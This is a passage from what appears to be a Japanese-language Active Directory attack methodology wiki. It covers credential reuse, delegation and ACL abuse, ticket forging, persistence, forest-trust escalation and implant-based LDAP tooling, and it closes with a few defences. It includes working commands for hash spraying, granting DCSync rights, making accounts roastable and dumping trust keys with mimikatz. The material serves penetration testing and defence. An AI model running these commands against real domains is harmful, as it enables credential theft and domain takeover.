../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

この脆弱性を悪用すると、認証済みのユーザーなら誰でも**ドメインコントローラーを侵害**できました。


{{#ref}}
printnightmare.md
{{#endref}}

## 特権のある認証情報/セッションを使った Active Directory の権限昇格

**以下の手法を実行するには、通常のドメインユーザーでは不十分です。これらの攻撃には特別な権限または認証情報が必要です。**

### ハッシュの抽出

[AsRepRoast](asreproast.md)、[Password Spraying](password-spraying.md)、[Kerberoast](kerberoast.md)、中継を含む[Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)、[EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)、[ローカルでの権限昇格](../windows-local-privilege-escalation/index.html)を使い、何らかのローカル管理者アカウントを**侵害できている**とよいでしょう。\
次に、メモリ内とローカルにあるすべてのハッシュをダンプします。\
[**ハッシュを取得するさまざまな方法については、このページを参照してください。**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**ユーザーのハッシュを入手したら**、それを使ってそのユーザーに**なりすます**ことができます。\
そのハッシュを**使って NTLM 認証を実行する**ツールを使うか、新しい**sessionlogon**を作成して、そのハッシュを**LSASS に注入**します。そうすれば、NTLM 認証が実行されるたびに、そのハッシュが**使用されます**。後者は mimikatz が行う方法です。\
[**詳しくはこのページを参照してください。**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

この攻撃では、一般的な NTLM プロトコル経由の Pass The Hash の代わりに、**ユーザーの NTLM ハッシュを使って Kerberos チケットを要求**します。そのため、NTLM プロトコルが無効化され、認証プロトコルとして**Kerberos のみが許可されている**ネットワークで特に**有用**です。


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

**Pass The Ticket (PTT)** 攻撃では、攻撃者はパスワードやハッシュ値ではなく、**ユーザーの認証チケットを窃取**します。窃取したチケットを使って**ユーザーになりすまし**、ネットワーク内のリソースやサービスに不正アクセスします。


{{#ref}}
pass-the-ticket.md
{{#endref}}

### 認証情報の再利用

ローカル**管理者**の**ハッシュ**または**パスワード**を持っている場合は、それを使って他の**PC**に**ローカルログイン**できるか試してください。

```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```

> [!WARNING]
> かなり**ノイジー**で、**LAPS**によって**軽減**できる点に注意してください。

### MSSQLの悪用と信頼されたリンク

ユーザーが**MSSQLインスタンスにアクセスする**権限を持っている場合、MSSQLホストがSAとして実行されていれば、ホスト上で**コマンドを実行**したり、NetNTLM **ハッシュを窃取**したり、**リレー攻撃**を実行したりできる可能性があります。\
あるMSSQLインスタンスが、別のインスタンスとのデータベースリンクを通じて信頼されている場合、リンク先データベースに対する権限を持つユーザーは、**信頼関係を利用してもう一方のインスタンス上でクエリを実行**できる可能性があります。これらの信頼関係は連鎖することがあり、最終的に設定ミスのあるデータベースに到達して、ユーザーがコマンドを実行できる場合があります。\
**データベース間のリンクは、フォレストの信頼関係を越えても機能します。**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT資産管理／デプロイメントプラットフォームの悪用

サードパーティ製のインベントリ管理・デプロイメントツールは、多くの場合、認証情報やコード実行につながる強力な経路を提供します。以下を参照してください。

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

[ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>)属性を持つComputerオブジェクトが見つかり、そのコンピューターでドメイン権限を持っている場合、そのコンピューターにログインしたすべてのユーザーのTGTをメモリからダンプできます。\
つまり、**Domain Adminがコンピューターにログインすると**、そのTGTをダンプし、[Pass the Ticket](pass-the-ticket.md)を使ってなりすますことができます。\
Constrained Delegationを利用すれば、**Print Serverを自動的に侵害**することさえ可能です（できれば、そのサーバーがDCであればなおよいでしょう）。


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

ユーザーまたはコンピューターが「Constrained Delegation」を許可されている場合、**コンピューター上の特定のサービスにアクセスするために、任意のユーザーになりすます**ことができます。\
そのため、このユーザー／コンピューターの**ハッシュを侵害**すれば、**任意のユーザー**（Domain Adminを含む）になりすまして、特定のサービスにアクセスできます。


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resource-based Constrained Delegation

リモートコンピューターのActive Directoryオブジェクトに対する**WRITE**権限があると、**昇格した権限**でコードを実行できるようになります。


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### 権限／ACLの悪用

侵害したユーザーが、ドメイン内のオブジェクトに対して**興味深い権限**を持っている場合があり、それを利用して横方向に**移動**したり、権限を**昇格**したりできます。


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spoolerサービスの悪用

ドメイン内で**Spoolサービスがリッスンしている**ことを発見できれば、それを**悪用**して**新たな認証情報を取得**し、**権限を昇格**できる可能性があります。


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### サードパーティのセッションの悪用

**他のユーザー**が**侵害された**マシンに**アクセス**する場合、メモリから**認証情報を収集**したり、そのプロセスに**ビーコンを注入**してユーザーになりすましたりできる可能性があります。\
通常、ユーザーはRDP経由でシステムにアクセスします。以下では、サードパーティのRDPセッションに対する2つの攻撃方法を紹介します。


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS**は、ドメインに参加しているコンピューターの**ローカルAdministratorパスワード**を管理する仕組みです。パスワードは**ランダム**で一意なものに設定され、定期的に**変更**されます。これらのパスワードはActive Directoryに保存され、ACLによって許可されたユーザーのみがアクセスできます。パスワードにアクセスする十分な権限があれば、他のコンピューターへピボットできるようになります。


{{#ref}}
laps.md
{{#endref}}

### 証明書の窃取

証明書の窃取やテンプレートの悪用に進む前に、AD CSの登録、証明書マッピング、列挙については[AD Certificates overview](ad-certificates.md)を参照してください。

侵害したマシンから**証明書を収集**することは、環境内で権限を昇格する方法の一つです。


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### 証明書テンプレートの悪用

**脆弱なテンプレート**が設定されている場合、それを悪用して権限を昇格できる可能性があります。


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## 高権限アカウントでのポストエクスプロイテーション

### ドメイン認証情報のダンプ

**Domain Admin**、さらに上位の**Enterprise Admin**権限を取得したら、**ドメインデータベース**（_ntds.dit_）を**ダンプ**できます。

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

`ntds.dit`と`SYSTEM`ハイブを含む、読み取り可能なバックアップアーカイブは、展開前であってもディレクトリデータの漏えいとして扱う必要があります。古いパスワードハッシュがあっても、他のオブジェクト属性が安全とは限りません。たとえば`description`フィールドに、認証情報や運用上のメモが含まれている場合があります。まずアーカイブ内のメンバー名を確認し、展開したデータベースの内容を通常の列挙結果に含めないようにしてください。

### 永続化のためのPrivesc

前述の手法の一部は、永続化にも利用できます。\
たとえば、次のことができます。

- ユーザーを[**Kerberoast**](kerberoast.md)の対象となる状態にする

  ```bash
  Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
  ```

- ユーザーを [**ASREPRoast**](asreproast.md) に対して脆弱にする

  ```bash
  Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
  ```

- ユーザーに[**DCSync**](#dcsync)権限を付与する

  ```bash
  Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
  ```

### Silver Ticket

**Silver Ticket attack**は、**NTLM hash**（たとえば、**PC account の hash**）を使用して、特定のサービス向けの**正規の Ticket Granting Service (TGS) ticket**を作成します。この手法は、**サービスの権限にアクセスする**ために使われます。


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack**は、Active Directory (AD) 環境で攻撃者が**krbtgt account の NTLM hash**を入手することで成立します。このアカウントは、AD ネットワーク内での認証に不可欠なすべての**Ticket Granting Ticket (TGT)**に署名するため、特別なアカウントです。

この hash を入手すると、攻撃者は任意のアカウントの**TGT**を作成できます（Silver ticket attack）。


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

これは、**一般的な Golden Ticket の検出機構を回避する**方法で偽造された Golden Ticket のようなものです。


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**アカウントの証明書を持っている、または証明書を要求できること**は、ユーザーがパスワードを変更しても、そのアカウントへのアクセスを維持する非常に有効な方法です。


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**証明書を使って、ドメイン内で高い権限を維持することも可能です:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directory の **AdminSDHolder** オブジェクトは、**特権グループ**（Domain Admins や Enterprise Admins など）に標準の**Access Control List (ACL)**を適用し、不正な変更を防ぐことで、これらのグループを保護します。しかし、この機能は悪用される可能性があります。攻撃者が AdminSDHolder の ACL を変更して一般ユーザーにフルアクセス権を与えると、そのユーザーはすべての特権グループを広範に制御できるようになります。このように、保護を目的としたセキュリティ対策が、綿密に監視されていない場合、かえって不当なアクセスを許す結果になり得ます。

[**AdminDSHolder Group の詳細はこちら。**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

すべての **Domain Controller (DC)** には、**local administrator** アカウントがあります。そのようなマシンで管理者権限を取得すると、**mimikatz**を使って local Administrator の hash を抽出できます。その後、レジストリを変更して**このパスワードを使用できるようにする**ことで、local Administrator アカウントにリモートアクセスできます。


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

特定のドメインオブジェクトに対する**特別な権限**を**ユーザーに付与**することで、そのユーザーが**将来的に権限を昇格**できるようにできます。


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**security descriptor**は、ある**オブジェクト**が別の**オブジェクト**に対して持つ**権限**を**保存する**ために使われます。オブジェクトの**security descriptor**を**少し変更する**だけで、特権グループに所属しなくても、そのオブジェクトに対する非常に有用な権限を取得できます。


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

`dynamicObject` auxiliary class を悪用し、`entryTTL`/`msDS-Entry-Time-To-Die` を設定して、短期間だけ存在する principal/GPO/DNS record を作成します。これらは tombstone を残さず自動削除されるため、LDAP の痕跡を消去できます。一方で、孤立した SID、壊れた `gPLink` 参照、キャッシュされた DNS 応答などは残ります（例: AdminSDHolder ACE の汚染、悪意のある `gPCFileSysPath`/AD-integrated DNS リダイレクト）。

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

メモリ上の **LSASS** を改変して**共通パスワード**を設定し、すべてのドメインアカウントへのアクセスを可能にします。


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[SSP (Security Support Provider) とは何か、こちらで確認してください。](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
独自の **SSP** を作成して、マシンへのアクセスに使われる**認証情報**を**平文で****取得**できます。


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

AD に**新しい Domain Controller**を登録し、それを使って指定したオブジェクトの属性（SIDHistory、SPN など）を**プッシュ**します。このとき、**変更に関するログは一切残りません**。**DA**権限が必要で、**root domain**内にいる必要があります。\
誤ったデータを使うと、非常に目立つログが残るので注意してください。


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

これまで、**LAPS password を読み取るのに十分な権限がある**場合の権限昇格について説明しました。しかし、これらのパスワードは**永続化の維持**にも使用できます。\
こちらを確認してください:


{{#ref}}
laps.md
{{#endref}}

## Forest の権限昇格 - Domain Trusts

Microsoft は **Forest** をセキュリティ境界と見なしています。つまり、**1つのドメインを侵害すると、Forest 全体が侵害される可能性があります**。<sup>[[1]](#references)</sup>

### 基本情報

[**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) は、ある**ドメイン**のユーザーが別の**ドメイン**のリソースにアクセスできるようにするセキュリティ機構です。基本的には、2つのドメインの認証システムを接続し、認証検証をシームレスに行えるようにします。ドメイン間で trust を設定すると、trust の完全性を保つうえで重要な特定の**key**が交換され、それぞれの **Domain Controller (DC)** に保存されます。

一般的な状況では、ユーザーが**信頼されたドメイン**内のサービスにアクセスする場合、まず自身のドメインの DC に **inter-realm TGT** と呼ばれる特別な ticket を要求します。この TGT は、両ドメインが合意した共有**key**で暗号化されます。次にユーザーは、この TGT を**信頼されたドメインの DC**に提示して、サービス ticket（**TGS**）を取得します。信頼されたドメインの DC が inter-realm TGT を正常に検証すると、TGS を発行し、ユーザーにサービスへのアクセスを許可します。

**手順**:

1. **Domain 1** の**クライアントコンピューター**は、自身の **NTLM hash** を使って **Domain Controller (DC1)** に **Ticket Granting Ticket (TGT)** を要求し、処理を開始します。
2. クライアントの認証に成功すると、DC1 は新しい TGT を発行します。
3. 次にクライアントは、**Domain 2** のリソースにアクセスするために必要な **inter-realm TGT** を DC1 に要求します。
4. inter-realm TGT は、双方向の domain trust の一部として DC1 と DC2 が共有する **trust key** で暗号化されます。
5. クライアントは inter-realm TGT を **Domain 2 の Domain Controller (DC2)** に渡します。
6. DC2 は共有 trust key を使って inter-realm TGT を検証し、有効であれば、クライアントがアクセスしようとしている Domain 2 内のサーバー向けに **Ticket Granting Service (TGS)** を発行します。
7. 最後にクライアントはこの TGS をサーバーに提示します。TGS はサーバーのアカウント hash で暗号化されており、これにより Domain 2 のサービスにアクセスできます。

### Trust の種類

**trust は一方向にも双方向にも設定できる**点に注意してください。双方向の場合、両方のドメインが互いを信頼します。一方、**一方向**の trust 関係では、一方が**信頼される**ドメイン、もう一方が**信頼する**ドメインになります。後者の場合、**信頼されるドメインから、信頼するドメイン内のリソースにのみアクセスできます**。

Domain A が Domain B を信頼している場合、A は信頼するドメインで、B は信頼されるドメインです。また、**Domain A** ではこれを **Outbound trust** と呼び、**Domain B** では **Inbound trust** と呼びます。

**Trust 関係の種類**

- **Parent-Child Trusts**: 同じ forest 内で一般的に使われる構成です。子ドメインは親ドメインと自動的に双方向の transitive trust を持ちます。つまり、親ドメインと子ドメインの間で認証要求をシームレスにやり取りできます。
- **Cross-link Trusts**: 「shortcut trust」とも呼ばれ、子ドメイン間に設定され、紹介処理を迅速化します。複雑な forest では、認証の紹介は通常、forest root まで移動してから対象ドメインへ下りる必要があります。cross-link を作成すると経路を短縮でき、特に地理的に離れた環境で有効です。
- **External Trusts**: 相互に関連のない異なるドメイン間に設定され、性質上 non-transitive です。[Microsoft のドキュメント](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)によると、external trust は、forest trust で接続されていない forest 外のドメイン内のリソースにアクセスする場合に役立ちます。external trust では SID filtering によってセキュリティが強化されます。
- **Tree-root Trusts**: forest root domain と新たに追加された tree root の間に自動的に設定されます。あまり一般的ではありませんが、forest に新しい domain tree を追加する際に重要です。これにより、新しい tree は独自の domain name を維持し、双方向の transitivity が確保されます。詳しくは[Microsoft のガイド](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)を参照してください。
- **Forest Trusts**: 2つの forest root domain 間に設定される双方向の transitive trust で、セキュリティ強化のために SID filtering も適用されます。
- **MIT Trusts**: Windows 以外の [RFC4120 準拠](https://tools.ietf.org/html/rfc4120)の Kerberos domain との間に設定されます。MIT trust はやや特殊で、Windows エコシステム外の Kerberos ベースのシステムとの統合が必要な環境に適しています。

#### **Trust 関係**におけるその他の違い

- trust 関係は **transitive**（A が B を信頼し、B が C を信頼するなら、A は C を信頼する）にも、**non-transitive** にもできます。
- trust 関係は **bidirectional trust**（互いに信頼する）にも、**one-way trust**（一方だけが他方を信頼する）にも設定できます。

### 攻撃経路

1. Trust 関係を**列挙**する
2. **security principal**（user/group/computer）が、ACE エントリーや他ドメインの group への所属によって、**他のドメイン**のリソースに**アクセス**できるか確認する。**ドメイン間の関係**を探す（おそらく、そのために trust が作成されています）。
   1. この場合、kerberoast も別の選択肢になります。
3. ドメイン間の pivot に利用できる**アカウントを侵害**する。

攻撃者が他のドメインのリソースにアクセスできる仕組みは、主に次の3つです。

- **Local Group Membership**: principal は、サーバー上の「Administrators」group など、マシンの local group に追加されていることがあります。これにより、そのマシンに対する大きな制御権が与えられます。
- **Foreign Domain Group Membership**: principal は、foreign domain 内の group のメンバーになっていることもあります。ただし、この方法が有効かどうかは、trust の種類と group の範囲によって異なります。
- **Access Control Lists (ACLs)**: principal が **ACL**、特に **DACL** 内の **ACE** に指定されていると、特定のリソースへのアクセス権を得る場合があります。ACL、DACL、ACE の仕組みを詳しく知りたい場合は、ホワイトペーパー「[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)」が非常に参考になります。<sup>[[17]](#references)</sup>

### 権限を持つ外部ユーザー/group の検索

**`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** を確認すると、そのドメイン内の foreign security principal を見つけられます。これらは**外部の domain/forest**に属する user/group です。

**Bloodhound**または powerview を使って確認できます:

```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```

### Child-to-Parent forest privilege escalation

```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```

ドメインの信頼関係を列挙するその他の方法:

```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```

> [!WARNING]
> **信頼されたキーが2つ**あります。1つは _子ドメイン --> 親ドメイン_ 用、もう1つは _親ドメイン --> 子ドメイン_ 用です。\
> 現在のドメインで使用されているキーは、次の方法で確認できます:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

SID-History injectionを悪用して、子/親ドメインに対するEnterprise adminへ権限昇格します。


{{#ref}}
sid-history-injection.md
{{#endref}}

#### 書き込み可能なConfiguration NCを悪用する

Active Directory (AD) 環境において、Configuration Naming Context (NC) をどのように悪用できるかを理解することは重要です。Configuration NCは、フォレスト全体の構成データを格納する中央リポジトリとして機能します。このデータはフォレスト内のすべてのDomain Controller (DC) に複製され、書き込み可能なDCはConfiguration NCの書き込み可能なコピーを保持します。これを悪用するには、**DC上のSYSTEM権限**が必要です。できれば子DCが望ましいです。

**GPOをルートDCサイトにリンクする**

Configuration NCのSitesコンテナには、ADフォレスト内のドメイン参加コンピューターのサイトに関する情報が含まれています。任意のDCでSYSTEM権限を使用すると、攻撃者はGPOをルートDCサイトにリンクできます。この操作によって、これらのサイトに適用されるポリシーを操作し、ルートドメインを侵害できる可能性があります。

詳しい情報については、[SID Filteringのバイパス](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)に関する調査を参照してください。<sup>[[12]](#references)</sup>

**フォレスト内の任意のgMSAを侵害する**

攻撃ベクトルの一つは、ドメイン内の特権を持つgMSAを標的にすることです。gMSAのパスワードを計算するために必要なKDS Root keyは、Configuration NCに保存されています。任意のDCでSYSTEM権限があれば、KDS Root keyにアクセスして、フォレスト内の任意のgMSAのパスワードを計算できます。

詳細な分析と手順については、以下を参照してください。


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

補完的な委任MSA攻撃（BadSuccessor – migration attributesの悪用）:


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

追加の外部調査: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)。<sup>[[13]](#references)</sup>

**Schema change攻撃**

この手法では、新しい特権ADオブジェクトが作成されるまで待つ必要があるため、忍耐が求められます。SYSTEM権限があれば、攻撃者はAD Schemaを変更し、任意のユーザーにすべてのクラスへの完全な制御権を付与できます。これにより、新しく作成されたADオブジェクトへの不正なアクセスや制御が可能になるおそれがあります。

詳しくは、[Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)を参照してください。<sup>[[14]](#references)</sup>

**ADCS ESC5によるDAからEAへの権限昇格**

ADCS ESC5の脆弱性は、PKIオブジェクトを制御し、フォレスト内の任意のユーザーとして認証できる証明書テンプレートを作成する攻撃です。PKIオブジェクトはConfiguration NCに存在するため、書き込み可能な子DCを侵害すればESC5攻撃を実行できます。

詳細は[ESC5によるDAからEAへの権限昇格](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)を参照してください。<sup>[[15]](#references)</sup> ADCSが存在しない環境でも、攻撃者は必要なコンポーネントをセットアップできます。詳細は[子ドメインのDomain AdminsからEnterprise Adminsへの権限昇格](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)を参照してください。<sup>[[16]](#references)</sup>

### 外部フォレストドメイン - 一方向（インバウンド）または双方向

```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```

このシナリオでは、外部ドメインから**信頼されている**ため、そのドメインに対して**不明な権限**を持っています。自分のドメインのどのプリンシパルが外部ドメインに対してどのアクセス権を持つのかを特定し、それを悪用してみる必要があります。

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### 外部フォレストドメイン - 一方向（Outbound）

```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```

このシナリオでは、**あなたのドメイン**が、**別のドメイン**のプリンシパルに対して一部の**権限**を**信頼**しています。

しかし、信頼元のドメインから信頼されると、信頼される側のドメインは、**予測可能な名前**で**ユーザーを作成**し、その**パスワードには信頼パスワードを使用**します。つまり、信頼元のドメインのユーザーに**アクセスして信頼される側のドメインに侵入**し、列挙したうえで、さらに権限昇格を試みることが可能です。


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

信頼される側のドメインを侵害するもう1つの方法は、ドメインの信頼関係とは**逆方向**に作成された[**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links)を見つけることです（これはあまり一般的ではありません）。

信頼される側のドメインを侵害する別の方法として、**信頼される側のドメインのユーザーがログインにRDPを使用できる**マシンで待機する方法があります。その後、攻撃者はRDPセッションのプロセスにコードを注入し、そこから**被害者の元のドメインにアクセス**できます。\
さらに、被害者が**ハードドライブをマウントしていた**場合、攻撃者は**RDPセッション**のプロセスから、そのハードドライブの**スタートアップフォルダー**に**バックドア**を保存できます。この手法は**RDPInception**と呼ばれます。


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### ドメイン信頼関係の悪用への対策

### **SID Filtering:**

- フォレスト間の信頼関係を越えてSID history属性を悪用する攻撃のリスクは、SID Filteringによって軽減されます。SID Filteringは、すべてのフォレスト間信頼でデフォルトで有効になっています。これは、Microsoftの見解に基づき、フォレストをドメインではなくセキュリティ境界とみなし、フォレスト内の信頼関係は安全であるという前提に立っています。
- ただし、注意点があります。SID filteringはアプリケーションやユーザーアクセスを妨げる可能性があるため、無効化されることがあります。

### **Selective Authentication:**

- フォレスト間の信頼関係では、Selective Authenticationを使用することで、2つのフォレストのユーザーが自動的に認証されないようにできます。その代わり、信頼元のドメインまたはフォレスト内のドメインやサーバーにアクセスするには、ユーザーに明示的な権限を付与する必要があります。
- これらの対策では、書き込み可能なConfiguration Naming Context (NC)の悪用や、信頼アカウントへの攻撃を防げない点に注意してください。

[**ired.teamのドメイン信頼関係に関する詳細情報。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## オンホストインプラントからのLDAPベースのAD悪用

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection)は、bloodyADスタイルのLDAPプリミティブを、オンホストインプラント（例：Adaptix C2）内で完全に実行されるx64 Beacon Object Filesとして再実装しています。オペレーターは`git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`でパックをコンパイルし、`ldap.axs`をロードしてから、ビーコン上で`ldap <subcommand>`を呼び出します。すべての通信は、現在のログオンセキュリティコンテキストを使い、署名またはシーリングを有効にしたLDAP (389)、あるいは証明書を自動的に信頼するLDAPS (636)経由で行われるため、socksプロキシやディスク上のアーティファクトは不要です。<sup>[[4]](#references)</sup>

### インプラント側のLDAP列挙

- `get-users`、`get-computers`、`get-groups`、`get-usergroups`、`get-groupmembers`は、短い名前やOUパスを完全なDNに解決し、対応するオブジェクトをダンプします。
- `get-object`、`get-attribute`、`get-domaininfo`は、任意の属性（セキュリティ記述子を含む）に加え、`rootDSE`からフォレスト／ドメインのメタデータを取得します。
- `get-uac`、`get-spn`、`get-delegation`、`get-rbcd`は、ロースティング対象の候補、委任設定、およびLDAPから取得した既存の[Resource-based Constrained Delegation](resource-based-constrained-delegation.md)記述子を提示します。
- `get-acl`と`get-writable --detailed`はDACLを解析して、信頼主体、権限（GenericAll/WriteDACL/WriteOwner/属性の書き込み）、および継承を一覧表示し、ACLを使った権限昇格の対象をすぐに特定できるようにします。

```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```

### エスカレーションと永続化のためのLDAP書き込みプリミティブ

- オブジェクト作成BOF（`add-user`、`add-computer`、`add-group`、`add-ou`）を使うと、OUへの権限がある場所に新しいプリンシパルやコンピューターアカウントを配置できます。`add-groupmember`、`set-password`、`add-attribute`、`set-attribute`は、書き込みプロパティ権限が見つかった対象を直接乗っ取ります。
- `add-ace`、`set-owner`、`add-genericall`、`add-genericwrite`、`add-dcsync`などのACLに特化したコマンドを使うと、任意のADオブジェクトに対するWriteDACL/WriteOwnerを、パスワードのリセット、グループメンバーシップの制御、DCSyncレプリケーション権限へと変換できます。PowerShell/ADSIの痕跡は残りません。`remove-*`系のコマンドで追加したACEをクリーンアップできます。

### 委任、roasting、Kerberosの悪用

- `add-spn`/`set-spn`を使うと、侵害したユーザーを即座にKerberoast可能にできます。`add-asreproastable`（UACの切り替え）は、パスワードに触れずに対象をAS-REP roastingの対象として設定します。
- 委任用マクロ（`add-delegation`、`set-delegation`、`add-constrained`、`add-unconstrained`、`add-rbcd`）は、beaconから`msDS-AllowedToDelegateTo`、UACフラグ、または`msDS-AllowedToActOnBehalfOfOtherIdentity`を書き換えます。これにより、制約付き/制約なし/RBCDの攻撃経路が可能になり、リモートPowerShellやRSATが不要になります。

### sidHistoryの注入、OUの移動、攻撃対象領域の調整

- `add-sidhistory`は、制御下のプリンシパルのSID historyに特権SIDを注入します（[SID-History Injection](sid-history-injection.md)を参照）。LDAP/LDAPS経由のみで、密かにアクセス権を継承できます。
- `move-object`は、コンピューターやユーザーのDN/OUを変更します。これにより、攻撃者は資産を委任された権限の範囲内に移動してから、`set-password`、`add-groupmember`、`add-spn`を実行できます。移動権限と継承の確認については、[OU relocation and inherited rights](acl-persistence-abuse/#moving-an-object-into-inherited-ou-permissions)を参照してください。
- 適用範囲を厳密に絞った削除コマンド（`remove-attribute`、`remove-delegation`、`remove-rbcd`、`remove-uac`、`remove-groupmember`など）を使うと、認証情報や永続化手段を収集した後に迅速にロールバックし、テレメトリを最小限に抑えられます。

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## 一般的な防御策

[**認証情報の保護方法について詳しくはこちら。**](../stealing-credentials/credentials-protections.md)

### **認証情報を保護するための防御策**

- **Domain Adminsの制限**: Domain AdminsのログインはDomain Controllerのみに許可し、他のホストでの使用を避けることを推奨します。
- **サービスアカウントの権限**: セキュリティを維持するため、サービスをDomain Admin（DA）権限で実行しないでください。
- **一時的な権限の制限**: DA権限が必要な作業では、その利用期間を制限してください。次のように設定できます: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relayの緩和策**: Event ID 2889/3074/3075を監査し、その後、DC/クライアントでLDAP signingとLDAPS channel bindingを強制して、LDAP MITM/relayの試みをブロックします。

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Impacketの活動におけるプロトコルレベルのフィンガープリンティング

